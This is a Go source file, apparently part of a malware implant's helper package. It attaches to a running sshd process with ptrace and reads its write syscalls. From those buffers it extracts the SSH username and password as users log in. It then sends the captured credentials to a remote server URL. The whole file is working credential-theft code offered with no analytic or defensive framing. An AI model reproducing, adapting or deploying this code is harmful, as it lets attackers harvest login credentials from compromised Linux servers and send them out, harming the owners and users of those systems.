//go:build linux

package agent_helper

import (
	"context"
	"fmt"
	"galleon/debug"
	"os"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"syscall"
)

func traceSSHDProcess(ctx context.Context, serverUrl string, taskData map[string]interface{}, pid int) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	if err := syscall.PtraceAttach(pid); err != nil {
		return
	}
	defer syscall.PtraceDetach(pid)

	var wstatus syscall.WaitStatus
	var inSyscall bool
	var firstValidCapture string
	shipped := false

	for {
		if ctx.Err() != nil {
			return
		}

		_, err := syscall.Wait4(pid, &wstatus, 0, nil)
		if err != nil {
			return
		}
		if ctx.Err() != nil {
			return
		}
		if wstatus.Exited() {
			return
		}

		if wstatus.StopSignal() == syscall.SIGTRAP {
			inSyscall = !inSyscall

			var regs syscall.PtraceRegs
			if err := syscall.PtraceGetRegs(pid, &regs); err != nil {
				return
			}

			// Only process write syscalls on entry, where the userspace buffer is valid
			if regs.Orig_rax == 1 && inSyscall && !shipped {
				fd := int(regs.Rdi)
				if fd >= 0 && fd <= 20 {
					bufferSize := int(regs.Rdx)
					if bufferSize > 3 && bufferSize < 250 {
						buffer := make([]byte, bufferSize)
						if _, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer); err != nil {
							syscall.PtraceSyscall(pid, 0)
							continue
						}

						var password string
						if len(buffer) >= 4 && buffer[0] == 0 && buffer[1] == 0 && buffer[2] == 0 {
							length := int(buffer[3])
							if length > 0 && length+4 <= len(buffer) {
								password = string(buffer[4 : 4+length])
							} else if length == 0 && len(buffer) > 4 {
								password = string(buffer[4:])
							} else {
								password = string(buffer)
							}
						} else {
							password = string(buffer)
						}

						password = RemoveNonPrintableAscii(password)
						if IsValidPassword(password) {
							if firstValidCapture == "" {
								// First valid capture during SSH auth is the username,
								// not the password. Store it and wait for the real password.
								firstValidCapture = password
							} else {
								username := extractSSHUsername(pid)
								if username == "unknown" {
									username = firstValidCapture
								}
								if debug.Debug {
									fmt.Printf("[!] Detected credentials from ssh: %v:%v\n", username, password)
								}
								go DataShipper(serverUrl, taskData, fmt.Sprintf("%v:%v", username, password))
								shipped = true
							}
						}
					}
				}
			}
		}

		if err := syscall.PtraceSyscall(pid, 0); err != nil {
			return
		}
	}
}

func extractSSHUsername(pid int) string {
	username := "unknown"
	cmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	cmdlineStr := strings.ReplaceAll(string(cmdline), "\x00", " ")

	usernamePattern := regexp.MustCompile(`sshd[^:]*:\s*([a-zA-Z0-9_-]+)`)
	matches := usernamePattern.FindStringSubmatch(cmdlineStr)
	if len(matches) == 2 {
		username = matches[1]
	}

	if username == "unknown" && strings.Contains(cmdlineStr, "[accepted]") {
		ppidData, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
		if err == nil {
			ppidStr := strings.Fields(string(ppidData))
			if len(ppidStr) > 3 {
				ppid, _ := strconv.Atoi(ppidStr[3])
				if ppid > 0 {
					parentCmdline, _ := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid))
					parentCmdlineStr := strings.ReplaceAll(string(parentCmdline), "\x00", " ")
					parentMatches := usernamePattern.FindStringSubmatch(parentCmdlineStr)
					if len(parentMatches) == 2 {
						username = parentMatches[1]
					}
				}
			}
		}
	}

	return username
}
